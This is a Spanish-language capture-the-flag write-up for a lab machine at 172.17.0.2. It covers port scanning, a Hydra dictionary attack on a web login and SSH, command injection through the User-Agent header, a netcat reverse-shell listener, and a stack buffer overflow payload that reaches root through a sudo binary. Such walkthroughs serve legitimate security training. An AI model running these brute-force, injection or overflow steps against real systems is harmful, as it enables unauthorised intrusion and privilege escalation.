## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/ef4ad12d-e455-4a13-b07f-1fe2f32fcd2e)

nmap reporta 2 servicios levantados, ssh y http asi que comienzo chequeando la web

![image](https://github.com/user-attachments/assets/41754477-d95b-4b33-994d-45a225b1558b)

me consigo con un panel de login, al parecer no es vulnerable a una inyeccion basica sql, asi que enumerare la web pero tampoco consigo nada por lo que ahora reviso el
codigo fuente y lo unico que puedo observar es un comentario 

![image](https://github.com/user-attachments/assets/86f43e38-1582-42b5-b654-9b0c4e83eb9f)

aunque no da ciertamente ninguna informacion, podria ser este el user para el panel de login por lo que aplicare un ataque de diccionario contra el panel

```ruby
hydra -l d1se0 -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^:F=¡Ups! Las credenciales no son correctas. Intenta nuevamente."
```

![image](https://github.com/user-attachments/assets/7690764f-b119-4711-9633-006e4e92a393)

obtengo credenciales para el acceso asi que me logueo

![image](https://github.com/user-attachments/assets/c66f18e9-53a1-408f-8853-f9b596849bea)

en este punto intente varios vectores de ataque hasta dar con el vector correcto, el user-agent es vulnerable directamente a ejecucion de comandos!!!

![image](https://github.com/user-attachments/assets/94e9ee72-c0cb-4fca-993d-9ab9c47a1371)

asi que inspecciono un poco el sistema desde este punto

![image](https://github.com/user-attachments/assets/958cee1e-9f24-48c3-9b28-243ff56f9705)

existe un solo usuario en el sistema, en este punto podria lanzarme una `webshell` y ganar acceso directamente o intentar un ataque de diccionario contra el servicio `ssh` y el user `flow`

```ruby
hydra -l flow -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

por esta via no obtengo resultados asi que me lanzo una `webshell`

```ruby
nc -lnvp 4445 # me coloco en escucha con netcat
```

![image](https://github.com/user-attachments/assets/3f675cec-ab10-4a86-a6c9-70ed0b11841e)

## Escalada de Privilegios

### www-data

tratamiento de la terminal

```
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

lo primero que realizo es una busqueda de archivos que pertenezcan al user `flow`

```ruby
find / -type f -user flow 2>/dev/null # buscamos archivos del user flow en el sistema
```

conseguirmos el archivo `/usr/bin/secret` que al leerlo obtenemos lo siguiente

![image](https://github.com/user-attachments/assets/f9a44958-e146-466d-914a-67cad8bc5c3f)

asi que decodifico 

```ruby
echo "MQYXGZJQNFZXI2DFMJSXG5CAEQSCC===" |base32 -d
```

y obtengo lo que parece ser la password de `flow` asi que la pruebo

![image](https://github.com/user-attachments/assets/76972d79-797e-4de0-8c67-faba9fea0132)

### flow

ahora como el user `flow` puedo ejecutar un binario como `root`

![image](https://github.com/user-attachments/assets/1ef82770-c76c-4aa6-a12e-f00c79bc8ed2)

![image](https://github.com/user-attachments/assets/022e9812-3921-4649-9b66-fe730f45d8b5)

algo interesante que veo es que el binario al no ser ejecutado como `root` lanza un mensaje adicional indicando que
no pudo abrir el archivo por permisos, asi que primero le hare reversing y analizarlo mejor 

![image](https://github.com/user-attachments/assets/2cd44df3-0662-4bee-b28c-6dcd75bb3218)

aqui puedo ver varios detalles dentro de la funcion `main`, comenzando por lo que parece ser que el tamano del buffer que 
almacena la entrada del usuario es de 76 byte, ademas veo que se hace uso de un condicional `if` para determinar el flujo del
programa dependiendo la entrada del usuario, por un lado si la entrada del usuario es igual a `0x726f6f74` entonces imprime el mensaje `"estas en modo administrador"` y llama a continuacion las funciones `write_key_to_file` & `execute_command` (al parecer al acceder al modo administrador es posible la ejecucion de comandos), en caso de ser la entrada diferente a `0x726f6f74` entonces imprime el mensaje `"estas en modo usuario"` y llama a las funciones `write_key_to_file` y `user_mode`.

Ahora analizare la funcion `write_key_to_file` que es la que me interesa ya que el binario interactua con un archivo (me di cuenta al ejecutar el binario sin sudo)

![image](https://github.com/user-attachments/assets/6021093e-1e7f-41b8-a7fe-3a1695938e86)

ahora en la funcion `write_key_to_file` puedo ver el archivo con el que esta interactuando >> `"/tmp/key_output.txt"`; ahora si reviso el archivo observo que imprime el valor de la `key`

![image](https://github.com/user-attachments/assets/230946cc-45a8-4749-bdf0-f15f6c18c614)

ahora intentare testear a ver si es posible cambiar el valor de la key

![image](https://github.com/user-attachments/assets/575ae2e7-454f-4250-9001-1f1e5e7981e9)

imprime un valor distinto, es decir, que a traves del input que le pasemos al binario varia la `key` y si paso el valor de la `key` a hexadecimal veo que su valor es `41414141`

![image](https://github.com/user-attachments/assets/b197144b-bfca-4ba2-8c95-6a997d57ec3b)

esto quiere decir que la key la he sobreescrito con las A's que pase en el input, y si recordamos el tamano del buffer 
que observamos en la funcion `main` indica que es de 76 byte por lo que le pasare 76 A y una B al final para ver si llego a sobreescribir la key con el valor de B  

![image](https://github.com/user-attachments/assets/113e9977-c19e-41a9-b011-c0d901a861f8)

la key ahora vale 66 y si lo paso a hexadecimal su valor es 42, es decir, B

![image](https://github.com/user-attachments/assets/0963b8b4-bf81-4b46-a513-90f90eda99fd)

como ya se que puedo manipular el valor de la `key` le pasare lo que solicita el binario `Tu clave sera "root" para entrar al modo administrador`, y como vimos en la funcion `main` espera `0x726f6f74` que es en efecto `root` asi que le envio el siguiente payload

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtoor
```

![image](https://github.com/user-attachments/assets/107bdb26-496f-41f1-9e38-df7a6aff0165)

he logrado acceder al modo administrador donde puedo ejecutar comandos, le paso `toor` y no `root` ya que se debe invertir el valor debido a que las maquinas actuales tienen arquitecturas `Little-Endian`, es decir, los bytes de una palabra se almacenan en orden inverso, del menos significativo al más significativo.

ahora solo me queda ejecutar un `/bin/bash` para obtener la `shell` como `root`

![image](https://github.com/user-attachments/assets/397605f5-83cf-436b-8da0-4610eeff9b28)

### PWNED-ROOT













































